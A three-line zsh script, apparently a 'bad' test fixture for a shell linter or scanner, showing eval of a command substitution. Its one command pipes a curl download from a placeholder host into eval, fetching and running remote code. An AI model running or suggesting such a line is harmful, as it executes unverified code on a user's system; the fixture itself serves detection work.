#!/usr/bin/env zsh
# bad/03_eval_cmdsub.zsh — eval of a $(...) command substitution.
eval "$(curl -fsSL https://example.invalid/install.sh)"
